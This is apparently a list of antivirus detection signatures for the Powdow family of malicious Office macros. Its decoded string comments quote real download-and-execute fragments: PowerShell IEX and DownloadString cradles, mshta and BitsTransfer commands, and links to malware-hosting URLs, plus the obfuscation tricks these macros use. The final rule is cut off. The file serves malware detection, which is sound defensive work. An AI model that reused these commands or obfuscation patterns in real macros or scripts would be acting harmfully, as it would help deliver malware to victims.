
rule TrojanDownloader_O97M_Powdow_SS_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 02 00 00 "
		
	strings :
		$a_01_0 = {6d 6c 6b 6a 6c 6a 6b 6a 6c 6b 72 67 6c 6b 6a 67 72 66 6a 6b 6c 6a 67 66 72 76 } //2 mlkjljkjlkrglkjgrfjkljgfrv
		$a_01_1 = {68 74 74 70 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 33 6f 78 36 74 39 74 } //2 http://tinyurl.com/y3ox6t9t
	condition:
		((#a_01_0  & 1)*2+(#a_01_1  & 1)*2) >=4
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 03 00 00 "
		
	strings :
		$a_01_0 = {4d 53 48 54 41 20 68 74 74 70 73 3a 2f 2f 6a 6f 72 6e 61 6c 64 61 63 69 64 61 64 65 2e 73 74 6f 72 65 2f } //2 MSHTA https://jornaldacidade.store/
		$a_01_1 = {53 68 65 6c 6c } //1 Shell
		$a_01_2 = {53 75 62 20 41 75 74 6f 5f 4f 70 65 6e 28 29 } //1 Sub Auto_Open()
	condition:
		((#a_01_0  & 1)*2+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 37 36 64 34 77 61 67 } //1 ttps://tinyurl.com/y76d4wag
		$a_01_1 = {2b 27 6c 6f 61 64 46 69 6c 65 27 29 } //1 +'loadFile')
		$a_01_2 = {28 6e 45 77 2d 6f 42 60 6a 65 63 54 20 4e 65 74 2e 57 65 62 63 4c 60 49 45 4e 74 29 } //1 (nEw-oB`jecT Net.WebcL`IENt)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {2b 27 6c 6f 61 64 46 69 6c 65 27 29 } //1 +'loadFile')
		$a_01_1 = {74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 61 70 66 37 6c 66 72 } //1 ttps://tinyurl.com/yapf7lfr
		$a_01_2 = {2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 22 24 7b 65 6e 56 60 3a 61 70 70 64 61 74 61 7d } //1 -Destination "${enV`:appdata}
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {2f 63 20 70 6f 5e 77 65 72 73 68 } //1 /c po^wersh
		$a_01_1 = {28 6e 45 77 2d 6f 42 60 6a 65 63 54 20 4e 65 } //1 (nEw-oB`jecT Ne
		$a_01_2 = {74 74 70 3a 2f 2f 68 6f 74 65 6c 63 6f 6e 74 69 6e 65 6e 74 61 6c 2d 6b 68 65 6e 69 66 72 61 2e 63 6f 6d 2f 61 64 6d 69 6e 2f 67 79 74 30 39 31 32 33 36 2e 65 78 65 } //1 ttp://hotelcontinental-khenifra.com/admin/gyt091236.exe
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {3d 20 22 74 70 73 3a 2f 2f 77 77 77 2e 64 69 61 6d 61 6e 74 65 73 76 69 61 67 65 6e 73 2e 63 6f 6d 2e 62 72 2f 74 65 72 63 61 2e } //1 = "tps://www.diamantesviagens.com.br/terca.
		$a_03_1 = {53 68 65 6c 6c 20 28 [0-05] 4d 5f 53 4f 69 4d 29 } //1
		$a_01_2 = {3d 20 22 68 74 61 22 } //1 = "hta"
		$a_01_3 = {3d 20 22 68 74 61 22 22 20 68 74 22 } //1 = "hta"" ht"
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_7{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {70 6f 5e 77 65 72 73 68 } //1 po^wersh
		$a_01_1 = {28 6e 45 77 2d 6f 42 60 6a 65 63 54 } //1 (nEw-oB`jecT
		$a_01_2 = {74 74 70 3a 2f 2f 72 65 62 72 61 6e 64 2e 6c 79 2f 57 64 42 50 41 70 6f 4d 41 43 52 4f 27 2c 27 61 2e 62 61 74 27 29 } //2 ttp://rebrand.ly/WdBPApoMACRO','a.bat')
		$a_01_3 = {74 74 70 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 35 6f 6e 6e 63 6e 6d } //2 ttp://tinyurl.com/y5onncnm
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*2+(#a_01_3  & 1)*2) >=4
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_8{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {68 74 74 70 73 3a 2f 2f 77 77 77 22 20 2b 20 22 2e 62 22 20 2b 20 22 69 22 20 2b 20 22 74 22 20 2b 20 22 6c 22 20 2b 20 22 79 22 20 2b 20 22 2e 22 20 2b 20 22 63 22 20 2b 20 22 6f 22 20 2b 20 22 6d 22 20 2b 20 22 2f 22 20 2b 20 22 64 68 67 6a 6b 73 61 68 64 73 61 22 20 2b 20 22 74 77 69 65 71 62 64 68 73 73 } //1 https://www" + ".b" + "i" + "t" + "l" + "y" + "." + "c" + "o" + "m" + "/" + "dhgjksahdsa" + "twieqbdhss
	condition:
		((#a_01_0  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_9{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 03 00 00 "
		
	strings :
		$a_01_0 = {68 74 74 70 3a 2f 2f 25 38 32 33 34 25 38 32 33 34 40 6a 2e 6d 70 2f 64 64 6b 6a 61 73 70 6f 71 77 69 6f 6b 61 73 6c 6b 64 6b 77 } //3 http://%8234%8234@j.mp/ddkjaspoqwiokaslkdkw
		$a_01_1 = {53 68 65 6c 6c 20 64 65 63 72 79 70 74 28 22 76 6f 74 6d 22 2c 20 22 36 22 29 } //1 Shell decrypt("votm", "6")
		$a_01_2 = {6d 79 43 68 72 79 73 6c 65 72 20 3d 20 64 65 63 72 79 70 74 28 22 72 22 2c 20 22 35 22 29 20 2b } //1 myChrysler = decrypt("r", "5") +
	condition:
		((#a_01_0  & 1)*3+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_10{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 43 6f 6d 6d 61 6e 64 20 49 45 58 20 28 4e 65 77 2d 4f 62 6a 65 63 74 28 27 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 27 29 29 2e 27 44 6f 57 6e 6c 6f 41 64 73 54 72 49 6e 47 27 28 27 68 74 27 2b 27 74 70 3a 2f 2f 72 6f 74 61 2d 72 2e 72 75 2f 77 70 2d 61 64 6d 69 6e 2f 63 73 73 2f 64 27 29 } //1 powershell.exe -Command IEX (New-Object('Net.WebClient')).'DoWnloAdsTrInG'('ht'+'tp://rota-r.ru/wp-admin/css/d')
	condition:
		((#a_01_0  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_11{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_03_0 = {74 70 3a 2f 2f 90 05 09 05 28 30 2d 39 29 25 90 05 09 05 28 30 2d 39 29 40 6a 2e 6d 70 2f 22 } //1
		$a_01_1 = {53 75 62 20 41 75 74 6f 5f 63 6c 6f 73 65 28 29 } //1 Sub Auto_close()
		$a_01_2 = {20 3d 20 22 68 74 61 22 22 20 68 74 22 } //1  = "hta"" ht"
		$a_01_3 = {20 3d 20 22 22 22 6d 73 22 } //1  = """ms"
		$a_03_4 = {4d 73 67 42 6f 78 20 28 22 4f 66 66 69 63 65 20 33 36 35 20 [0-0f] 22 29 3a 20 53 68 65 6c 6c 20 28 22 57 49 4e 57 4f 52 44 20 2b } //1
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_03_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_12{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 04 00 00 "
		
	strings :
		$a_01_0 = {74 70 3a 2f 2f 31 32 33 30 39 31 32 34 38 39 25 31 32 33 30 31 39 32 33 30 39 40 6a 2e 6d 70 2f } //5 tp://1230912489%1230192309@j.mp/
		$a_01_1 = {61 73 64 6f 61 6b 73 64 6f 73 61 73 64 6b 64 6b 6f 64 6b } //1 asdoaksdosasdkdkodk
		$a_01_2 = {4d 73 67 42 6f 78 20 28 22 4f 66 66 69 63 65 20 33 36 35 20 4e 6f 74 20 69 6e 73 74 61 6c 6c 65 64 21 22 29 3a 20 53 68 65 6c 6c 20 28 22 57 49 4e 57 4f 52 44 22 29 } //1 MsgBox ("Office 365 Not installed!"): Shell ("WINWORD")
		$a_03_3 = {50 44 66 5f 33 [0-0f] 20 3d 20 22 6a 61 73 } //1
	condition:
		((#a_01_0  & 1)*5+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_13{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_03_0 = {53 68 65 6c 6c 20 28 [0-07] 4d 5f 53 4f 69 4d 29 } //1
		$a_01_1 = {3d 20 22 68 74 61 22 } //1 = "hta"
		$a_01_2 = {3d 20 22 74 70 73 3a 2f 2f 77 77 77 2e 72 69 76 69 65 72 61 64 65 73 61 6f 6c 6f 75 2e 63 6f 6d 2e 62 72 2f } //2 = "tps://www.rivieradesaolou.com.br/
		$a_01_3 = {3d 20 22 74 70 73 3a 2f 2f 77 77 77 2e 64 69 61 6d 61 6e 74 65 73 76 69 61 67 65 6e 73 2e 63 6f 6d 2e 62 72 2f } //2 = "tps://www.diamantesviagens.com.br/
		$a_01_4 = {3d 20 22 22 22 6d 73 } //1 = """ms
		$a_01_5 = {3d 20 22 68 74 61 22 22 20 68 74 22 } //1 = "hta"" ht"
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*2+(#a_01_3  & 1)*2+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_14{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 03 00 00 "
		
	strings :
		$a_01_0 = {63 6f 6d 20 3d 20 22 68 74 74 70 73 3a 2f 2f 70 61 73 74 65 62 69 6e 2e 63 6f 6d 2f 72 61 77 2f 71 6d 67 56 69 61 31 5a } //1 com = "https://pastebin.com/raw/qmgVia1Z
		$a_01_1 = {52 65 73 75 6c 74 61 64 6f 20 3d 20 57 69 6e 45 78 65 63 28 22 63 6d 64 2e 65 78 65 20 2f 63 20 6d 73 68 74 61 2e 65 78 65 20 22 20 26 20 63 6f 6d 2c 20 30 29 } //1 Resultado = WinExec("cmd.exe /c mshta.exe " & com, 0)
		$a_01_2 = {55 73 65 72 46 6f 72 6d 31 2e 57 65 62 42 72 6f 77 73 65 72 31 2e 4e 61 76 69 67 61 74 65 20 28 22 61 62 6f 75 74 3a 62 6c 61 6e 6b 22 29 } //1 UserForm1.WebBrowser1.Navigate ("about:blank")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_15{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {68 74 74 70 3a 2f 2f 31 32 33 30 39 34 38 25 31 32 33 30 39 34 38 25 31 32 33 30 39 34 38 25 31 32 33 30 39 34 38 40 6a 2e 6d 70 2f 76 62 64 6a 73 61 67 64 6a 67 61 73 67 63 76 61 64 66 67 73 61 64 67 68 61 6e } //1 http://1230948%1230948%1230948%1230948@j.mp/vbdjsagdjgasgcvadfgsadghan
		$a_01_1 = {4d 73 67 42 6f 78 20 28 22 45 72 72 6f 72 21 22 29 3a 20 53 68 65 6c 6c 20 28 22 70 69 6e 67 2e 65 78 65 22 29 3a 20 53 68 65 6c 6c 20 28 57 49 4e 57 4f 52 44 20 2b } //1 MsgBox ("Error!"): Shell ("ping.exe"): Shell (WINWORD +
		$a_01_2 = {3d 20 64 65 63 72 79 70 74 28 22 6e 22 2c 20 22 36 22 29 } //1 = decrypt("n", "6")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_16{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {58 60 45 60 49 20 7c 27 27 20 6e 69 6f 6a 2d 20 6d 6a 24 3b 7d 29 20 29 36 31 2c 5f 24 28 36 31 74 6e 69 6f 74 3a 3a 20 5d 74 72 65 76 6e 6f 63 5b 28 5d 72 61 68 63 5b 20 7b 20 68 63 61 45 72 6f 66 20 7c 20 29 27 25 27 20 28 74 69 6c 70 53 2e 73 72 61 68 43 69 69 63 73 20 61 24 3d 6d 6a 24 3b 27 39 32 25 37 32 25 33 37 } //1 X`E`I |'' nioj- mj$;}) )61,_$(61tniot:: ]trevnoc[(]rahc[ { hcaErof | )'%' (tilpS.srahCiics a$=mj$;'92%72%37
		$a_01_1 = {68 43 69 69 63 73 61 24 20 6e 65 64 64 69 68 } //1 hCiicsa$ neddih
		$a_01_2 = {65 6c 79 74 53 77 6f 64 6e 69 57 } //1 elytSwodniW
		$a_01_3 = {6c 65 68 73 72 65 77 6f } //1 lehsrewo
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_17{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 04 00 00 "
		
	strings :
		$a_01_0 = {74 70 3a 2f 2f 31 32 33 30 39 34 38 25 31 32 33 30 39 34 38 40 6a 2e 6d 70 } //5 tp://1230948%1230948@j.mp
		$a_01_1 = {32 33 62 62 73 64 61 6a 73 38 32 31 } //1 23bbsdajs821
		$a_01_2 = {4d 73 67 42 6f 78 20 28 22 4f 66 66 69 63 65 20 33 36 35 20 4e 6f 74 20 69 6e 73 74 61 6c 6c 65 64 21 22 29 3a 20 53 68 65 6c 6c 20 28 22 57 49 4e 57 4f 52 44 22 29 } //1 MsgBox ("Office 365 Not installed!"): Shell ("WINWORD")
		$a_01_3 = {4d 73 67 42 6f 78 20 28 22 4f 66 66 69 63 65 20 33 36 35 20 4e 6f 20 49 6e 73 74 61 6c 6c 61 74 69 6f 6e 22 29 3a 20 53 68 65 6c 6c 20 28 22 57 49 4e 57 4f 52 44 20 2b } //1 MsgBox ("Office 365 No Installation"): Shell ("WINWORD +
	condition:
		((#a_01_0  & 1)*5+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_18{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {24 54 65 6d 70 44 69 72 3b 28 4e 65 77 2d 4f 62 6a 65 63 74 20 53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 } //1 $TempDir;(New-Object System.Net.WebClient)
		$a_01_1 = {2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 73 3a 2f 2f 62 69 74 62 75 63 6b 65 74 2e 6f 72 67 2f 73 65 76 65 63 61 2d 65 6d 69 6c 69 61 2f 6f 6e 65 6d 6f 72 65 73 6c 61 76 65 2f 64 6f 77 6e 6c 6f 61 64 73 2f 73 7a 2e 65 78 65 27 2c } //1 .DownloadFile('https://bitbucket.org/seveca-emilia/onemoreslave/downloads/sz.exe',
		$a_01_2 = {24 54 65 6d 70 44 69 72 2b 27 74 65 73 74 2e 65 78 65 27 29 3b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 27 74 65 73 74 2e 65 78 65 27 } //1 $TempDir+'test.exe');Start-Process 'test.exe'
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_19{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_03_0 = {44 65 62 75 67 2e 50 72 69 6e 74 20 4d 73 67 42 6f 78 28 22 45 52 52 4f 52 21 52 65 2d 49 6e 73 74 61 6c 6c 20 4f 66 66 69 63 65 22 2c 20 76 62 4f 4b 43 61 6e 63 65 6c 29 3b 20 72 65 74 75 72 6e 73 3b 20 31 [0-03] 6f 62 6a 2e 6c 6f 6c [0-03] 45 6e 64 20 53 75 62 } //1
		$a_03_1 = {44 65 62 75 67 2e 41 73 73 65 72 74 20 28 56 42 41 2e 53 68 65 6c 6c 28 6c 6f 6c 29 29 [0-03] 45 6e 64 20 46 75 6e 63 74 69 6f 6e } //1
		$a_03_2 = {46 75 6e 63 74 69 6f 6e 20 6c 6f 6c 28 29 [0-03] 6c 6f 6c 20 3d 20 [0-16] 2e [0-16] 2e 54 61 67 } //1
	condition:
		((#a_03_0  & 1)*1+(#a_03_1  & 1)*1+(#a_03_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_20{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_03_0 = {28 30 2c 20 22 6f 70 65 6e 22 2c 20 22 65 78 70 6c 6f 72 65 72 22 2c 20 [0-15] 2c 20 22 22 2c 20 31 29 } //1
		$a_03_1 = {3d 20 52 65 70 6c 61 63 65 28 [0-15] 2c 20 22 2e 63 6d 7a 22 2c 20 22 2e 63 6d 22 29 } //1
		$a_01_2 = {26 20 22 20 2d 77 20 68 69 20 73 5e 6c 65 65 70 20 2d 53 65 20 33 31 3b 53 74 61 72 74 2d 42 69 74 73 54 72 5e 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 6a 6b 6c 61 69 72 65 73 6f 6c 75 74 69 6f 6e 73 2e 63 6f 6d 2f 7a 61 2d 61 64 6d 69 6e 2f 6d 61 6e 6e 67 65 72 2f 74 6f 64 61 79 2e 65 60 78 65 } //1 & " -w hi s^leep -Se 31;Start-BitsTr^ansfer -Source htt`p://jklairesolutions.com/za-admin/mannger/today.e`xe
	condition:
		((#a_03_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_21{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 50 72 6f 63 65 73 73 41 28 30 26 2c 20 43 68 72 28 31 31 32 29 20 2b 20 22 6f 77 65 72 22 20 2b 20 22 73 68 65 6c 6c 2e 65 78 65 20 22 20 2b 20 43 68 72 28 31 35 30 29 20 2b 20 22 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 22 20 2b 20 22 20 20 49 45 58 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 53 74 72 69 6e 67 28 27 68 74 74 70 73 3a 2f 2f 66 69 6c 65 62 69 6e 2e 6e 65 74 2f 65 62 63 73 7a 62 64 6e 75 6a 35 6d 77 77 66 77 2f 62 6f 6f 6b 2e 70 73 31 27 29 } //1 = CreateProcessA(0&, Chr(112) + "ower" + "shell.exe " + Chr(150) + "WindowStyle Hidden" + "  IEX (New-Object Net.WebClient).DownloadString('https://filebin.net/ebcszbdnuj5mwwfw/book.ps1')
	condition:
		((#a_01_0  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_22{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {53 65 74 20 47 48 44 73 79 72 69 52 4a 64 52 43 20 3d 20 56 42 41 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 62 73 44 4b 43 71 61 58 6e 55 4a 58 74 45 28 41 72 72 61 79 28 37 39 2c 31 35 39 2c 28 31 38 20 2b 20 28 32 34 20 2d 20 35 29 29 } //1 Set GHDsyriRJdRC = VBA.CreateObject(bsDKCqaXnUJXtE(Array(79,159,(18 + (24 - 5))
		$a_01_1 = {2e 52 75 6e 28 73 6e 77 6a 6d 4e 66 46 44 6c 73 4c 43 2e 52 65 61 64 4c 69 6e 65 2c 20 78 51 68 50 6f 4d 75 67 5a 6b 44 73 6d 67 72 2c 20 69 76 56 79 7a 69 46 57 76 53 58 58 29 } //1 .Run(snwjmNfFDlsLC.ReadLine, xQhPoMugZkDsmgr, ivVyziFWvSXX)
		$a_01_2 = {26 20 43 68 72 28 58 52 69 7a 53 48 69 51 43 75 71 74 7a 53 6d 28 69 29 20 58 6f 72 20 49 70 6d 61 47 6a 5a 44 52 54 54 4b 28 69 29 29 } //1 & Chr(XRizSHiQCuqtzSm(i) Xor IpmaGjZDRTTK(i))
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_23{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {6a 6c 64 6f 6b 65 67 62 70 75 71 20 28 71 70 6d 65 29 } //1 jldokegbpuq (qpme)
		$a_03_1 = {69 62 65 6a 76 75 20 3d 20 22 57 53 43 72 69 70 74 2e 73 68 65 6c 6c 22 [0-03] 53 65 74 20 61 76 63 6a 79 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 69 62 65 6a 76 75 29 } //1
		$a_01_2 = {68 67 69 62 61 79 67 62 70 65 61 77 6b 6f 20 3d 20 61 76 63 6a 79 2e 52 75 6e 28 79 6c 66 75 6b 64 65 67 6e 73 66 73 76 2c 20 70 77 69 69 6d 66 29 } //1 hgibaygbpeawko = avcjy.Run(ylfukdegnsfsv, pwiimf)
		$a_01_3 = {4d 73 67 42 6f 78 20 22 54 69 6d 65 20 74 6f 20 74 61 6b 65 20 61 20 62 72 65 61 6b 21 } //1 MsgBox "Time to take a break!
		$a_01_4 = {73 64 66 63 73 20 3d 20 43 68 72 28 73 74 79 75 69 75 74 79 20 2d 20 31 31 31 29 } //1 sdfcs = Chr(styuiuty - 111)
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_24{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_03_0 = {73 74 72 55 52 4c 20 3d 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e [0-30] 2e 63 6f 6d 2f (66 69 6c 65 73|70 72 6f 6a 65 63 74 73) 2f 65 6e 71 75 69 72 79 2e 7a 69 70 } //1
		$a_01_1 = {73 74 72 52 6f 62 6f 61 70 70 50 61 74 68 20 3d 20 22 43 3a 5c 55 73 65 72 73 5c 22 20 26 20 45 6e 76 69 72 6f 6e 28 22 55 73 65 72 4e 61 6d 65 22 29 20 26 20 22 5c 44 6f 63 75 6d 65 6e 74 73 5c 22 20 26 20 43 75 72 72 65 6e 63 79 54 6f 6b 65 6e 20 27 59 6f 75 72 20 70 61 74 68 20 68 65 72 65 } //1 strRoboappPath = "C:\Users\" & Environ("UserName") & "\Documents\" & CurrencyToken 'Your path here
		$a_01_2 = {76 61 72 50 72 6f 63 20 3d 20 53 68 65 6c 6c 28 73 74 72 52 6f 62 6f 61 70 70 50 61 74 68 2c 20 31 29 } //1 varProc = Shell(strRoboappPath, 1)
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_25{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_01_0 = {4e 65 20 3d 20 22 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a } //1 Ne = "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
		$a_01_1 = {6f 53 68 65 6c 6c 2e 52 75 6e 20 22 63 73 63 72 69 70 74 2e 65 78 65 20 25 61 70 70 64 61 74 61 25 5c 77 77 77 2e 74 78 74 } //1 oShell.Run "cscript.exe %appdata%\www.txt
		$a_01_2 = {43 61 6c 6c 20 43 72 65 61 74 65 46 69 6c 65 } //1 Call CreateFile
		$a_01_3 = {52 4f 20 3d 20 45 6e 76 69 72 6f 6e 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 20 26 20 22 5c 41 70 70 44 61 74 61 5c 52 6f 61 6d 69 6e 67 5c 22 } //1 RO = Environ("USERPROFILE") & "\AppData\Roaming\"
		$a_01_4 = {66 73 6f 2e 4d 6f 76 65 46 69 6c 65 20 52 4f 20 2b 20 73 73 2c 20 52 4f 49 } //1 fso.MoveFile RO + ss, ROI
		$a_01_5 = {52 4f 49 20 3d 20 52 4f 20 2b 20 22 77 77 77 2e 70 73 31 } //1 ROI = RO + "www.ps1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}
rule TrojanDownloader_O97M_Powdow_SS_MTB_26{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_01_0 = {53 65 74 20 6f 62 6a 57 73 68 53 68 65 6c 6c 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 } //1 Set objWshShell = CreateObject("WScript.Shell")
		$a_01_1 = {6f 62 6a 57 73 68 53 68 65 6c 6c 2e 50 6f 70 75 70 } //1 objWshShell.Popup
		$a_01_2 = {53 70 65 63 69 61 6c 50 61 74 68 20 3d 20 6f 62 6a 57 73 68 53 68 65 6c 6c 2e 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 73 28 22 54 65 6d 70 6c 61 74 65 73 22 29 } //1 SpecialPath = objWshShell.SpecialFolders("Templates")
